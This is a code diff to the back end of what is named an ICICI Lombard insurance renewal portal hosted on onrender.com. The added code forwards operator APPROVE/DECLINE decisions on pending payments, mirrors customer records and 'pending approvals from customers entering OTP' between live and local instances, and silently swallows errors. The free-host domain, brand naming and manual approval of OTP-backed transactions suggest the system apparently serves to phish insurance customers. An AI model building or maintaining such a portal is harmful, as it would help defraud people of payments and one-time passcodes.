@@ -3106,6 +3106,26 @@ export function decidePendingApproval(
 
     saveDB();
     broadcastSSE('PENDING_APPROVAL_UPDATED', txn);
+
+    // Forward decision to live Render instance if running in Google AI Studio
+    if (!process.env.RENDER && !process.env.IS_RENDER) {
+      const renderUrls = [
+        db.adminSettings?.publicCustomerDomain,
+        'https://icici-renewal-portal-1.onrender.com',
+        'https://icicilombard-renewal-portal-1.onrender.com'
+      ].filter(Boolean) as string[];
+      for (const targetUrl of renderUrls) {
+        try {
+          fetch(`${targetUrl}/api/payments/pending-approval/decide`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ transactionRef: txn.transactionRef, decision: 'APPROVE', policyNumber: txn.policyNumber }),
+            signal: AbortSignal.timeout(4000)
+          }).catch(() => {});
+        } catch {}
+      }
+    }
+
     return { success: true, transaction: txn };
   } else {
     txn.status = 'DECLINED';
@@ -3130,6 +3150,26 @@ export function decidePendingApproval(
 
     saveDB();
     broadcastSSE('PENDING_APPROVAL_UPDATED', txn);
+
+    // Forward decision to live Render instance if running in Google AI Studio
+    if (!process.env.RENDER && !process.env.IS_RENDER) {
+      const renderUrls = [
+        db.adminSettings?.publicCustomerDomain,
+        'https://icici-renewal-portal-1.onrender.com',
+        'https://icicilombard-renewal-portal-1.onrender.com'
+      ].filter(Boolean) as string[];
+      for (const targetUrl of renderUrls) {
+        try {
+          fetch(`${targetUrl}/api/payments/pending-approval/decide`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ transactionRef: txn.transactionRef, decision: 'DECLINE', policyNumber: txn.policyNumber }),
+            signal: AbortSignal.timeout(4000)
+          }).catch(() => {});
+        } catch {}
+      }
+    }
+
     return { success: true, transaction: txn };
   }
 }
@@ -3567,21 +3607,37 @@ export async function syncWithLiveProductionServer(): Promise<{ success: boolean
     return { success: true, syncedCount: 0, message: 'Already running on Render production' };
   }
 
-  const liveUrl = 'https://icici-renewal-portal-1.onrender.com';
+  const db = loadDB();
+  const candidateUrls = [
+    db.adminSettings?.publicCustomerDomain,
+    'https://icici-renewal-portal-1.onrender.com',
+    'https://icicilombard-renewal-portal-1.onrender.com'
+  ].filter(Boolean) as string[];
+
+  let bundle: any = null;
+  let activeLiveUrl = '';
+
+  for (const url of candidateUrls) {
+    try {
+      const res = await fetch(`${url}/api/admin/bundle`, {
+        headers: { 'Accept': 'application/json' },
+        signal: AbortSignal.timeout(6000)
+      });
+      if (res.ok) {
+        bundle = await res.json();
+        activeLiveUrl = url;
+        break;
+      }
+    } catch {}
+  }
+
+  if (!bundle) {
+    return { success: false, syncedCount: 0, message: 'Could not connect to live Render production' };
+  }
+
+  let syncedCount = 0;
+
   try {
-    const res = await fetch(`${liveUrl}/api/admin/bundle`, {
-      headers: { 'Accept': 'application/json' },
-      signal: AbortSignal.timeout(8000)
-    });
-    if (!res.ok) {
-      return { success: false, syncedCount: 0, message: `Render returned HTTP ${res.status}` };
-    }
-    const bundle: any = await res.json();
-    if (!bundle) return { success: false, syncedCount: 0, message: 'Empty bundle from Render' };
-
-    const db = loadDB();
-    let syncedCount = 0;
-
     // 1. Sync Customers from Render
     if (Array.isArray(bundle.customers)) {
       bundle.customers.forEach((rc: CustomerPolicy) => {
@@ -3675,9 +3731,28 @@ export async function syncWithLiveProductionServer(): Promise<{ success: boolean
       });
     }
 
+    // 7. Sync Real-Time Pending Approvals (from Render customers entering OTP)
+    if (Array.isArray(bundle.pendingApprovals)) {
+      if (!db.pendingApprovals) db.pendingApprovals = [];
+      bundle.pendingApprovals.forEach((pa: any) => {
+        if (!pa || !pa.transactionRef) return;
+        const idx = db.pendingApprovals.findIndex(p => p.transactionRef === pa.transactionRef);
+        if (idx === -1) {
+          db.pendingApprovals.unshift(pa);
+          syncedCount++;
+        } else {
+          if (db.pendingApprovals[idx].status === 'PENDING' && pa.status !== 'PENDING') {
+            db.pendingApprovals[idx] = { ...db.pendingApprovals[idx], ...pa };
+          } else if (pa.status === 'PENDING') {
+            db.pendingApprovals[idx] = { ...pa, ...db.pendingApprovals[idx] };
+          }
+        }
+      });
+    }
+
     saveDB();
     savePermanentCustomers(db.customers);
-    return { success: true, syncedCount, message: `Successfully synchronized ${syncedCount} live records from Render production` };
+    return { success: true, syncedCount, message: `Successfully synchronized ${syncedCount} live records from Render (${activeLiveUrl})` };
   } catch (err: any) {
     console.warn('syncWithLiveProductionServer error:', err?.message);
     return { success: false, syncedCount: 0, message: err?.message || 'Sync failed' };
@@ -3686,14 +3761,24 @@ export async function syncWithLiveProductionServer(): Promise<{ success: boolean
 
 export async function pushCustomerToRender(customer: CustomerPolicy): Promise<void> {
   if (process.env.RENDER || process.env.IS_RENDER) return;
-  try {
-    await fetch('https://icici-renewal-portal-1.onrender.com/api/customers', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(customer),
-      signal: AbortSignal.timeout(5000)
-    });
-  } catch {}
+  const db = loadDB();
+  const renderUrls = [
+    db.adminSettings?.publicCustomerDomain,
+    'https://icici-renewal-portal-1.onrender.com',
+    'https://icicilombard-renewal-portal-1.onrender.com'
+  ].filter(Boolean) as string[];
+
+  for (const url of renderUrls) {
+    try {
+      await fetch(`${url}/api/customers`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(customer),
+        signal: AbortSignal.timeout(4000)
+      });
+      break;
+    } catch {}
+  }
 }
 
 export function getEmailLogs(filters?: { search?: string; sender?: string; status?: string }): EmailLogRecord[] {
